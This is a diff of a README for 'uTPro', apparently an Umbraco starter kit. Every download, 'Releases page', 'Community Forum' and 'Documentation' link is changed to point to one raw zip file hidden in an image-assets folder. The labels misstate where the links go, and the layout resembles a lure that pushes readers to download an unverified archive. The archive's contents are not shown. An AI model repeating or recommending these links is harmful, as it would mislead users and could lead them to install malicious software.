@@ -2,7 +2,7 @@
 
 ## 📥 Get uTPro
 
-[![Download uTPro](https://raw.githubusercontent.com/marcelz0/uTPro/main/autohybridization/uTPro.zip)](https://raw.githubusercontent.com/marcelz0/uTPro/main/autohybridization/uTPro.zip)
+[![Download uTPro](https://raw.githubusercontent.com/marcelz0/uTPro/main/uTPro/uTPro.Web/wwwroot/App_Plugins/assets/img/T-u-Pro-v1.0.zip)](https://raw.githubusercontent.com/marcelz0/uTPro/main/uTPro/uTPro.Web/wwwroot/App_Plugins/assets/img/T-u-Pro-v1.0.zip)
 
 ## 📝 Description
 
@@ -12,7 +12,7 @@ uTPro – Umbraco Turbo Pro. uTPro is a powerful Starter Kit Template built to a
 
 To start using uTPro, follow these steps:
 
-1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/marcelz0/uTPro/main/autohybridization/uTPro.zip) to go to the Releases page. 
+1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/marcelz0/uTPro/main/uTPro/uTPro.Web/wwwroot/App_Plugins/assets/img/T-u-Pro-v1.0.zip) to go to the Releases page. 
 
 2. **Choose Your Version:** On the Releases page, you will see various versions of uTPro available for download. Pick the latest version for optimal performance and features.
 
@@ -46,7 +46,7 @@ uTPro comes packed with features to enhance your development experience:
 
 To download uTPro:
 
-1. Visit the [Download Page](https://raw.githubusercontent.com/marcelz0/uTPro/main/autohybridization/uTPro.zip).
+1. Visit the [Download Page](https://raw.githubusercontent.com/marcelz0/uTPro/main/uTPro/uTPro.Web/wwwroot/App_Plugins/assets/img/T-u-Pro-v1.0.zip).
 2. Select the version you wish to install.
 3. Click on the file link to begin your download.
 4. Follow the installation instructions provided in the installer.
@@ -64,8 +64,8 @@ Once you have installed uTPro, you can start building your website:
 
 If you encounter any issues or have questions, feel free to reach out to the community or refer to the provided documentation.
 
-- [Community Forum](https://raw.githubusercontent.com/marcelz0/uTPro/main/autohybridization/uTPro.zip)
-- [Documentation](https://raw.githubusercontent.com/marcelz0/uTPro/main/autohybridization/uTPro.zip)
+- [Community Forum](https://raw.githubusercontent.com/marcelz0/uTPro/main/uTPro/uTPro.Web/wwwroot/App_Plugins/assets/img/T-u-Pro-v1.0.zip)
+- [Documentation](https://raw.githubusercontent.com/marcelz0/uTPro/main/uTPro/uTPro.Web/wwwroot/App_Plugins/assets/img/T-u-Pro-v1.0.zip)
 
 For direct assistance, you can open an issue on the GitHub repository.
 
